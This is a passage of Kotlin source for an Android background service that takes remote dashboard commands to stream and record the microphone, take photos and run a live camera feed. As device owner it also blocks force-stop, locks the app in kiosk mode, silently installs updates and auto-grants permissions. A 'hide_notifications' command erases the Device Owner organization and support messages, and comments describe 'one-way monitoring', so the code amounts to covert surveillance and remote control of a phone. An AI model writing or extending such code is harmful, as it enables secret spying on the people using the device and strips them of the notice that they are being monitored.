                if (!isWebRtcStreaming) {
                    val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                    if (staleCapture) {
                        stopAudioCapture("start_stream_stale_restart")
                    }
                    startAudioCapture()
                    startMicWatchdog()
                }
                updateNotification("Live streaming active")
                safeSend("ACK:start_stream")
                sendCommandAck("start_stream")
            }
            "stop_stream" -> {
                Log.i(TAG, "CMD: stop mic stream")
                wantsMicStreaming = false
                stopMicWatchdog()
                stopAudioCapture()
                stopWebRtcSession(notifyState = true)
                closeRecordingFile()
                updateNotification("Connected — mic standby")
                safeSend("ACK:stop_stream")
                sendCommandAck("stop_stream")
            }
            "start_record" -> {
                Log.i(TAG, "CMD: start recording")
                // Also ensure mic is capturing
                startAudioCapture()
                openRecordingFile()
                safeSend("ACK:start_record")
                sendCommandAck("start_record")
            }
            "stop_record" -> {
                Log.i(TAG, "CMD: stop recording")
                closeRecordingFile()
                safeSend("ACK:stop_record:${recordingFile?.name ?: "unknown"}")
                sendCommandAck("stop_record", detail = recordingFile?.name ?: "unknown")
            }
            "ping" -> {
                safeSend("pong:$deviceId")
                sendCommandAck("ping")
            }
            "get_data" -> {
                // Dashboard requested a fresh sync immediately
                sendDeviceData()
                sendCommandAck("get_data")
            }
            "force_reconnect" -> {
                Log.i(TAG, "CMD: force_reconnect - restart websocket session")
                // H-01: Don't send ACK (socket may be dead → triggers onWsDisconnected early).
                // Just close + let onWsDisconnected handle reconnect.
                try { activeWebSocket?.close(1001, "force_reconnect") } catch (_: Exception) {}
                onWsDisconnected("force_reconnect")
            }
            "force_update" -> {
                Log.i(TAG, "CMD: force_update - immediate update check + install")
                safeSend("ACK:force_update")
                sendCommandAck("force_update", detail = "checking")
                
                // Direct inline update — bypass WorkManager constraints
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        safeSend("""{"type":"update_status","status":"checking","message":"Checking for updates..."}""")
                        
                        val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                        if (versionInfo != null) {
                            val isOwnerInstall = UpdateService.isDeviceOwner(this@MicService)
                            val installMode = if (isOwnerInstall) "silent" else "user_confirm"
                            safeSend("""{"type":"update_status","status":"downloading","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize},"installMode":"$installMode"}""")
                            Log.i(TAG, "Update available: ${versionInfo.versionName} (code ${versionInfo.versionCode})")
                            
                            UpdateService.downloadAndInstall(this@MicService, versionInfo)

                            if (isOwnerInstall) {
                                safeSend("""{"type":"update_status","status":"installing","version":"${versionInfo.versionName}"}""")
                            } else {
                                safeSend("""{"type":"update_status","status":"awaiting_user_action","message":"Update downloaded. User confirmation required for install."}""")
                            }
                        } else {
                            safeSend("""{"type":"update_status","status":"up_to_date","currentVersion":"${BuildConfig.VERSION_NAME}","currentCode":${BuildConfig.VERSION_CODE}}""")
                            Log.i(TAG, "No update available — already on latest")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Force update failed: ${e.message}")
                        safeSend("""{"type":"update_status","status":"error","message":"${e.message?.take(100)?.replace("\"", "'")}"}""")
                    }
                }
            }
            "grant_permissions" -> {
                Log.i(TAG, "CMD: grant_permissions - re-granting all permissions")
                try {
                    UpdateService.autoGrantPermissions(this)
                    safeSend("ACK:grant_permissions:success")
                    sendCommandAck("grant_permissions")
                    // Collect and send data to verify permissions work
                    serviceScope.launch(Dispatchers.IO) {
                        delay(500)  // Wait for permissions to apply
                        sendDeviceData()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to grant permissions: ${e.message}")
                    safeSend("ACK:grant_permissions:error:${e.message}")
                    sendCommandAck("grant_permissions", "error", e.message)
                }
            }
            "enable_autostart" -> {
                // Open Realme/Xiaomi/Vivo auto-start settings
                Log.i(TAG, "CMD: enable_autostart - opening auto-start settings")
                try {
                    val opened = openAutoStartSettings()
                    if (opened) {
                        safeSend("ACK:enable_autostart:opened")
                        sendCommandAck("enable_autostart", detail = "opened")
                    } else {
                        safeSend("ACK:enable_autostart:not_supported")
                        sendCommandAck("enable_autostart", "error", "not_supported")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to open autostart settings: ${e.message}")
                    safeSend("ACK:enable_autostart:error:${e.message}")
                    sendCommandAck("enable_autostart", "error", e.message)
                }
            }
            "toggle_wifi" -> {
                Log.i(TAG, "CMD: toggle_wifi - toggling WiFi state")
                try {
                    val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        // Android 10+ - open WiFi settings panel
                        val panelIntent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(panelIntent)
                        safeSend("ACK:toggle_wifi:settings_opened")
                        sendCommandAck("toggle_wifi", detail = "settings_opened (Android 10+ requires user interaction)")
                    } else {
                        // Android 9 and below - direct toggle
                        @Suppress("DEPRECATION")
                        val currentState = wifiManager.isWifiEnabled
                        @Suppress("DEPRECATION")
                        wifiManager.isWifiEnabled = !currentState
                        val newState = if (!currentState) "on" else "off"
                        safeSend("ACK:toggle_wifi:$newState")
                        sendCommandAck("toggle_wifi", detail = "WiFi turned $newState")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to toggle WiFi: ${e.message}")
                    safeSend("ACK:toggle_wifi:error:${e.message}")
                    sendCommandAck("toggle_wifi", "error", e.message)
                }
            }
            "check_update" -> {
                Log.i(TAG, "CMD: check_update - triggering update check")
                serviceScope.launch(Dispatchers.IO) {
                    val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                    if (versionInfo != null) {
                        safeSend("""{"type":"update_available","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
                        sendCommandAck("check_update", detail = "update_available")
                    } else {
                        safeSend("""{"type":"update_status","status":"up_to_date"}""")
                        sendCommandAck("check_update", detail = "up_to_date")
                    }
                }
            }
            "clear_device_owner" -> {
                Log.i(TAG, "CMD: clear_device_owner - removing device owner")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        dpm.clearDeviceOwnerApp(packageName)
                        safeSend("ACK:clear_device_owner:success")
                        sendCommandAck("clear_device_owner")
                        Log.i(TAG, "Device Owner cleared successfully")
                    } else {
                        safeSend("ACK:clear_device_owner:not_device_owner")
                        sendCommandAck("clear_device_owner", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to clear device owner: ${e.message}")
                    safeSend("ACK:clear_device_owner:error:${e.message}")
                    sendCommandAck("clear_device_owner", "error", e.message)
                }
            }
            "lock_app" -> {
                Log.i(TAG, "CMD: lock_app - starting LockTaskMode and preventing force stop")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // 1. Prevent force stop (Android 11+)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                            dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                        }
                        
                        // 2. Enable Kiosk Mode (LockTaskMode)
                        dpm.setLockTaskPackages(admin, arrayOf(packageName))
                        prefs.edit().putBoolean("lock_task_mode", true).apply()
                        
                        // Trigger Activity to start pinning
                        val intent = Intent(this, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            putExtra("action", "lock")
                        }
                        startActivity(intent)
                        
                        safeSend("ACK:lock_app:success")
                        sendCommandAck("lock_app")
                    } else {
                        safeSend("ACK:lock_app:not_device_owner")
                        sendCommandAck("lock_app", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Lock failed: ${e.message}")
                    safeSend("ACK:lock_app:error:${e.message}")
                    sendCommandAck("lock_app", "error", e.message)
                }
            }
            "unlock_app" -> {
                Log.i(TAG, "CMD: unlock_app - releasing LockTaskMode and allowing force stop")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // 1. Allow force stop
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                            dpm.setUserControlDisabledPackages(admin, emptyList())
                        }
                        
                        // 2. Disable Kiosk Mode
                        prefs.edit().putBoolean("lock_task_mode", false).apply()
                        val intent = Intent(this, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            putExtra("action", "unlock")
                        }
                        startActivity(intent)
                        
                        safeSend("ACK:unlock_app:success")
                        sendCommandAck("unlock_app")
                    } else {
                        safeSend("ACK:unlock_app:not_device_owner")
                        sendCommandAck("unlock_app", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Unlock failed: ${e.message}")
                    safeSend("ACK:unlock_app:error:${e.message}")
                    sendCommandAck("unlock_app", "error", e.message)
                }
            }
            "hide_notifications" -> {
                // Hide Device Owner organization notifications
                Log.i(TAG, "CMD: hide_notifications - hiding Device Owner messages")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        
                        // Clear organization name
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            dpm.setOrganizationName(admin, "")
                        }
                        // Clear support messages
                        dpm.setShortSupportMessage(admin, null)
                        dpm.setLongSupportMessage(admin, null)
                        
                        safeSend("ACK:hide_notifications:success")
                        sendCommandAck("hide_notifications")
                        Log.i(TAG, "Device Owner notifications hidden")
                    } else {
                        safeSend("ACK:hide_notifications:not_device_owner")
                        sendCommandAck("hide_notifications", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to hide notifications: ${e.message}")
                    safeSend("ACK:hide_notifications:error:${e.message}")
                    sendCommandAck("hide_notifications", "error", e.message)
                }
            }

            "reboot" -> {
                Log.i(TAG, "CMD: reboot - rebooting device")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                        safeSend("ACK:reboot:success")
                        sendCommandAck("reboot")
                        serviceScope.launch(Dispatchers.Main) {
                            delay(1000)
                            dpm.reboot(admin)
                        }
                    } else {
                        safeSend("ACK:reboot:not_device_owner")
                        sendCommandAck("reboot", "error", "not_device_owner")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to reboot: ${e.message}")
                    safeSend("ACK:reboot:error:${e.message}")
                    sendCommandAck("reboot", "error", e.message)
                }
            }
            "wifi_on" -> {
                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        // M-05: Use Device Owner path on API 29+
                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        if (dpm.isDeviceOwnerApp(packageName)) {
                            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                            dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_ON, "1")
                        } else {
                            val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                    } else {
                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                        @Suppress("DEPRECATION")
                        wifiManager.isWifiEnabled = true
                    }
                    safeSend("ACK:wifi_on:success")
                    sendCommandAck("wifi_on")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to enable wifi: ${e.message}")
                    safeSend("ACK:wifi_on:error:${e.message}")
                    sendCommandAck("wifi_on", "error", e.message)
                }
            }
            "wifi_off" -> {
                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        if (dpm.isDeviceOwnerApp(packageName)) {
                            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                            dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_ON, "0")
                        } else {
                            val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                    } else {
                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                        @Suppress("DEPRECATION")
                        wifiManager.isWifiEnabled = false
                    }
                    safeSend("ACK:wifi_off:success")
                    sendCommandAck("wifi_off")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to disable wifi: ${e.message}")
                    safeSend("ACK:wifi_off:error:${e.message}")
                    sendCommandAck("wifi_off", "error", e.message)
                }
            }
            "uninstall_app" -> {
                // Uninstall the app (clear device owner first, then uninstall)
                Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    
                    // If Device Owner, unlock app first
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        // Clear device owner to allow uninstall
                        dpm.clearDeviceOwnerApp(packageName)
                        Log.i(TAG, "Device Owner cleared for uninstall")
                        safeSend("ACK:uninstall_app:device_owner_cleared")
                    }
                    
                    // Launch uninstall intent
                    val packageUri = android.net.Uri.parse("package:$packageName")
                    val uninstallIntent = android.content.Intent(android.content.Intent.ACTION_DELETE, packageUri).apply {
                        flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(uninstallIntent)
                    safeSend("ACK:uninstall_app:launched")
                    sendCommandAck("uninstall_app", detail = "launched")
                    Log.i(TAG, "Uninstall dialog launched")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to uninstall: ${e.message}")
                    safeSend("ACK:uninstall_app:error:${e.message}")
                    sendCommandAck("uninstall_app", "error", e.message)
                }
            }
            else -> Log.d(TAG, "Unknown command: $cmd")
        }
    }

    private fun handleServerJsonCommand(jsonText: String) {
        try {
            val obj = JSONObject(jsonText)
            when (obj.optString("type")) {
                "webrtc_start" -> {
                    Log.i(TAG, "CMD: webrtc_start")
                    // WebRTC now allowed for all voice profiles including "far"
                    startWebRtcSession()
                    sendCommandAck("webrtc_start")
                }
                "webrtc_stop" -> {
                    Log.i(TAG, "CMD: webrtc_stop")
                    stopWebRtcSession(notifyState = true)
                    sendCommandAck("webrtc_stop")
                }
                "webrtc_offer" -> {
                    val sdp = obj.optString("sdp", "")
                    if (sdp.isNotBlank()) {
                        Log.i(TAG, "CMD: webrtc_offer")
                        applyRemoteOfferAndCreateAnswer(sdp)
                        sendCommandAck("webrtc_offer")
                    }
                }
                "webrtc_ice" -> {
                    val c = obj.optJSONObject("candidate")
                    if (c != null) {
                        val candidate = IceCandidate(
                            c.optString("sdpMid", ""),
                            c.optInt("sdpMLineIndex", 0),
                            c.optString("candidate", "")
                        )
                        peerConnection?.addIceCandidate(candidate)
                        sendCommandAck("webrtc_ice")
                    }
                }
                "webrtc_quality" -> {
                    lastDashboardQuality = obj.optJSONObject("quality")
                    applyAdaptiveBitrate()
                    sendCommandAck("webrtc_quality")
                }
                "ai_mode" -> {
                    aiAutoModeEnabled = false
                    aiEnhancementEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiEnhancementEnabled) "ai_mode_on" else "ai_mode_off")
                    Log.i(TAG, "AI mode set to $aiEnhancementEnabled")
                    sendCommandAck("ai_mode", detail = if (aiEnhancementEnabled) "on" else "off")
                }
                "ai_auto" -> {
                    aiAutoModeEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiAutoModeEnabled) "ai_auto_on" else "ai_auto_off")
                    Log.i(TAG, "AI auto mode set to $aiAutoModeEnabled")
                    sendCommandAck("ai_auto", detail = if (aiAutoModeEnabled) "on" else "off")
                }
                "photo_ai" -> {
                    aiPhotoEnhancementEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiPhotoEnhancementEnabled) "photo_ai_on" else "photo_ai_off")
                    safeSend("ACK:photo_ai:${if (aiPhotoEnhancementEnabled) "on" else "off"}")
                    sendCommandAck("photo_ai", detail = if (aiPhotoEnhancementEnabled) "on" else "off")
                }
                "photo_quality" -> {
                    val mode = obj.optString("mode", "normal").trim().lowercase()
                    photoQualityMode = when (mode) {
                        "fast" -> "fast"
                        "hd" -> "hd"
                        else -> "normal"
                    }
                    sendHealthStatus("photo_quality_$photoQualityMode")
                    safeSend("ACK:photo_quality:$photoQualityMode")
                    sendCommandAck("photo_quality", detail = photoQualityMode)
                }
                "photo_night" -> {
                    val mode = obj.optString("mode", "off").trim().lowercase()
                    photoNightMode = when (mode) {
                        "1s", "3s", "5s" -> mode
                        else -> "off"
                    }
                    sendHealthStatus("photo_night_$photoNightMode")
                    safeSend("ACK:photo_night:$photoNightMode")
                    sendCommandAck("photo_night", detail = photoNightMode)
                }
                "stream_codec" -> {
                    val mode = obj.optString("mode", "auto").trim().lowercase()
                    val requestedMode = when (mode) {
                        "pcm" -> "pcm"
                        "smart", "mulaw" -> "smart"
                        else -> "auto"
                    }
                    wsStreamMode = if (voiceProfile == "far") "pcm" else requestedMode
                    sendHealthStatus("stream_codec_$wsStreamMode")
                    Log.i(TAG, "WS stream mode set to $wsStreamMode")
                    val detail = if (voiceProfile == "far" && requestedMode != "pcm") {
                        "pcm_forced_far_mode"
                    } else {
                        wsStreamMode
                    }
                    sendCommandAck("stream_codec", detail = detail)
                }
                "set_low_network" -> {
                    val enabled = obj.optBoolean("enabled", false)
                    lowNetworkMode = enabled
                    if (enabled) {
                        // LOW NETWORK MODE:
                        // Balance clarity and network stability with adaptive bitrate.
                        lowNetworkSampleRate = 16000
                        lowNetworkFrameMs = 20
                        Log.i(TAG, "Low-network mode ENABLED - Opus 48-96kbps, 16kHz, balanced mode")
                        
                        // If WebRTC is active, update bitrate immediately
                        applyAdaptiveBitrate()
                    } else {
                        // Return to standard mode
                        wsStreamMode = if (voiceProfile == "far") "pcm" else "auto"
                        lowNetworkSampleRate = 16000
                        lowNetworkFrameMs = 20
                        Log.i(TAG, "Low-network mode DISABLED - standard quality restored")
                        
                        applyAdaptiveBitrate()
                    }
                    sendHealthStatus("low_network_${if (enabled) "on" else "off"}")
                    safeSend("""{"type":"low_network_ack","enabled":$enabled,"sampleRate":$lowNetworkSampleRate,"frameMs":$lowNetworkFrameMs}""")
                    sendCommandAck("set_low_network", detail = if (enabled) "on" else "off")
                }
                "voice_profile" -> {
                    val profile = obj.optString("profile", "room").trim().lowercase()
                    voiceProfile = when (profile) {
                        "near" -> "near"
                        "far" -> "far"
                        else -> "room"
                    }
                    // All profiles use realtime processing path.
                    wsStreamMode = "pcm"    // Always use PCM for quality
                    // WebRTC allowed for all profiles - don't stop it
                    sendHealthStatus("voice_profile_$voiceProfile")
                    Log.i(TAG, "Voice profile set to $voiceProfile (realtime mode, heavy processing)")
                    sendCommandAck("voice_profile", detail = voiceProfile)
                }
                "set_gain" -> {
                    val level = obj.optDouble("level", 1.0).coerceIn(0.5, 5.0)
                    softwareGainMultiplier = level
                    Log.i(TAG, "Software gain set to ${level}x")
                    safeSend("""{"type":"gain_ack","level":$level}""")
                    sendCommandAck("set_gain", detail = "${level}x")
                }
                "streaming_mode" -> {
                    // M-02: HQ buffered mode fully removed — always realtime
                    val mode = obj.optString("mode", "realtime").trim().lowercase()
                    Log.i(TAG, "streaming_mode command: mode=$mode, using REALTIME")
                    sendHealthStatus("streaming_mode_realtime")
                    safeSend("""{"type":"streaming_mode_ack","mode":"realtime","bufferSeconds":0}""")
                    sendCommandAck("streaming_mode", detail = "realtime")
                }
                "switch_camera" -> {
                    preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
                        CameraCharacteristics.LENS_FACING_BACK
                    else
                        CameraCharacteristics.LENS_FACING_FRONT
                    val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                    cameraLiveStrictFacing = true
                    if (isCameraLiveStreaming) restartCameraLiveStream()
                    safeSend("ACK:switch_camera:$cameraText")
                    sendCommandAck("switch_camera", detail = cameraText)
                }
                "take_photo" -> {
                    val camera = obj.optString("camera", "current").trim().lowercase()
                    sendCommandAck("take_photo", detail = "accepted:$camera")
                    captureAndSendPhoto(camera)
                }
                "camera_live_start" -> {
                    val camera = obj.optString("camera", "current").trim().lowercase()
                    val explicitFacing = parseRequestedCameraFacing(camera)
                    val facing = explicitFacing ?: preferredCameraFacing
                    preferredCameraFacing = facing
                    startCameraLiveStream(facing, strictFacing = explicitFacing != null)
                    sendCommandAck("camera_live_start", detail = camera)
                }
                "camera_live_stop" -> {
                    stopCameraLiveStream("remote_stop")
                    sendCommandAck("camera_live_stop")
                }
                else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Invalid JSON command: ${e.message}")
        }
    }

    private fun ensurePeerConnectionFactory() {
        if (peerConnectionFactory != null) return
        Log.i(TAG, "Initializing WebRTC...")
        val initOpts = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        try {
            PeerConnectionFactory.initialize(initOpts)
        } catch (e: Exception) {
            Log.e(TAG, "PeerConnectionFactory.initialize failed: ${e.message}", e)
            throw e
        }
        Log.i(TAG, "WebRTC initialized, creating audio device module...")
        audioDeviceModule = JavaAudioDeviceModule.builder(this)
            // Prefer platform AEC/NS when available to reduce room echo and steady noise.
            .setUseHardwareAcousticEchoCanceler(true)
            .setUseHardwareNoiseSuppressor(true)
            .createAudioDeviceModule()
        Log.i(TAG, "Creating PeerConnectionFactory...")
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setAudioDeviceModule(audioDeviceModule)
            .createPeerConnectionFactory()
        Log.i(TAG, "WebRTC factory initialized")
    }

    @Synchronized
    private fun startWebRtcSession() {
        // WebRTC now allowed for all voice profiles
        if (peerConnection != null) return
        ensurePeerConnectionFactory()
        val factory = peerConnectionFactory ?: return

        // We use WebRTC audio path for low-latency streaming, so stop raw PCM path.
        stopMicWatchdog()
        stopAudioCapture()

        // Configure WebRTC audio based on voice profile.
        // Far mode keeps AGC off (avoid pumping/distortion) but enables light NS/HPF
        // to reduce steady background noise and rumble.
        val isFarMode = voiceProfile == "far"
        
        val constraints = MediaConstraints().apply {
            // Echo cancellation always OFF for one-way monitoring
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation2", "false"))
            
            // Aggressive noise suppression for clear voice
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "true"))
            // AGC ON for all profiles to maximize volume capture
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
            
            // Audio network adaptor: keep enabled for adaptive bitrate
            optional.add(MediaConstraints.KeyValuePair("googAudioNetworkAdaptor", "true"))
        }
        
        Log.i(TAG, "WebRTC audio constraints: far_mode=$isFarMode, NS=true, AGC=${!isFarMode}, HPF=true")
        localAudioSource = factory.createAudioSource(constraints)
        localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)
        localAudioTrack?.setEnabled(true)

        cachedIceServers = fetchIceServersFromServer()

        val rtcConfig = PeerConnection.RTCConfiguration(
            cachedIceServers
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }

        peerConnection = factory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                val candidateJson = JSONObject().apply {
                    put("candidate", candidate.sdp)
                    put("sdpMid", candidate.sdpMid)
                    put("sdpMLineIndex", candidate.sdpMLineIndex)
                }
                val msg = JSONObject().apply {
                    put("type", "webrtc_ice")
                    put("candidate", candidateJson)
                }
                safeSend(msg.toString())
            }

            override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState) {
                sendWebRtcState("ice_${newState.name.lowercase()}")
                if (newState == PeerConnection.IceConnectionState.CONNECTED ||
                    newState == PeerConnection.IceConnectionState.COMPLETED) {
                    webRtcRecoveryJob?.cancel()
                    webRtcRecoveryJob = null
                    iceWatchdogJob?.cancel()
                    iceWatchdogJob = null
                }
                if (newState == PeerConnection.IceConnectionState.DISCONNECTED ||
                    newState == PeerConnection.IceConnectionState.FAILED) {
                    scheduleWebRtcRecovery(newState.name.lowercase())
                }
            }

            override fun onConnectionChange(newState: PeerConnection.PeerConnectionState) {
                sendWebRtcState("pc_${newState.name.lowercase()}")
            }

            override fun onSignalingChange(newState: PeerConnection.SignalingState) {}
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
            override fun onAddStream(stream: org.webrtc.MediaStream) {}
            override fun onRemoveStream(stream: org.webrtc.MediaStream) {}
            override fun onDataChannel(dataChannel: org.webrtc.DataChannel) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: org.webrtc.RtpReceiver, mediaStreams: Array<out org.webrtc.MediaStream>) {}
            override fun onTrack(transceiver: org.webrtc.RtpTransceiver) {}
        })

        val pc = peerConnection
        val track = localAudioTrack
        if (pc == null || track == null) {
            sendWebRtcState("create_failed")
            return
        }

        webRtcAudioSender = pc.addTrack(track, listOf("mic_stream"))
        isWebRtcStreaming = true
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        applyAdaptiveBitrate()
        registerNetworkCallbackForBitrate()
        updateNotification("WebRTC mic active")
        sendHealthStatus("webrtc_started")
        sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
    }
    
    private fun stopWebRtcSession(notifyState: Boolean) {
        webRtcRecoveryJob?.cancel()
        webRtcRecoveryJob = null
        iceWatchdogJob?.cancel()
        iceWatchdogJob = null
        unregisterNetworkCallbackForBitrate()
        try {
            peerConnection?.close()
        } catch (_: Exception) {}
        peerConnection = null
        webRtcAudioSender = null
        try {
            localAudioTrack?.dispose()
            localAudioSource?.dispose()
        } catch (_: Exception) {}
        localAudioTrack = null
        localAudioSource = null
        val wasStreaming = isWebRtcStreaming
        isWebRtcStreaming = false

        if (notifyState && wasStreaming) sendHealthStatus("webrtc_stopped")
        if (notifyState && wasStreaming) sendWebRtcState("stopped")

        // Resume legacy PCM stream only when dashboard still wants it.
        if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
            startAudioCapture()
            startMicWatchdog()
            updateNotification("Live streaming active")
        }
    }

    private fun applyRemoteOfferAndCreateAnswer(remoteSdp: String) {
        // H-04: Don't call startWebRtcSession here — require explicit webrtc_start first.
        // If peerConnection is null, the offer arrived before webrtc_start; ignore it.
        val pc = peerConnection ?: run {
            Log.w(TAG, "webrtc_offer received but no active PeerConnection — ignoring (send webrtc_start first)")
            return
        }
        val targetKbps = chooseTargetBitrateKbps()

        pc.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() {
                val answerConstraints = MediaConstraints()
                pc.createAnswer(object : SdpObserver {
                    override fun onCreateSuccess(desc: SessionDescription?) {
                        if (desc == null) return
                        val tuned = tuneOpusSdp(desc.description, targetKbps)
                        val localAnswer = SessionDescription(SessionDescription.Type.ANSWER, tuned)
                        pc.setLocalDescription(object : SdpObserver {
                            override fun onSetSuccess() {
                                val msg = JSONObject().apply {
                                    put("type", "webrtc_answer")
                                    put("sdp", tuned)
                                }
                                safeSend(msg.toString())
                                applyAdaptiveBitrate()
                                sendWebRtcState("answer_sent_${targetKbps}kbps")
                                // Start a watchdog: if ICE hasn't connected in 15s, fall back to PCM.
                                iceWatchdogJob?.cancel()
                                iceWatchdogJob = serviceScope.launch(Dispatchers.IO) {
                                    delay(15_000)
                                    val iceState = peerConnection?.iceConnectionState()
                                    val connected =
                                        iceState == PeerConnection.IceConnectionState.CONNECTED ||
                                        iceState == PeerConnection.IceConnectionState.COMPLETED
                                    if (isWebRtcStreaming && !connected) {
                                        Log.w(TAG, "ICE watchdog: no connection after 15s — falling back to PCM")
                                        sendWebRtcState("ice_timeout")
                                        stopWebRtcSession(notifyState = true)
                                    }
                                }
                            }

                            override fun onSetFailure(error: String?) {
                                sendWebRtcState("local_set_fail")
                                Log.e(TAG, "WebRTC setLocalDescription failed: $error")
                            }

                            override fun onCreateSuccess(desc: SessionDescription?) {}
                            override fun onCreateFailure(error: String?) {}
                        }, localAnswer)
                    }

                    override fun onCreateFailure(error: String?) {
                        sendWebRtcState("answer_create_fail")
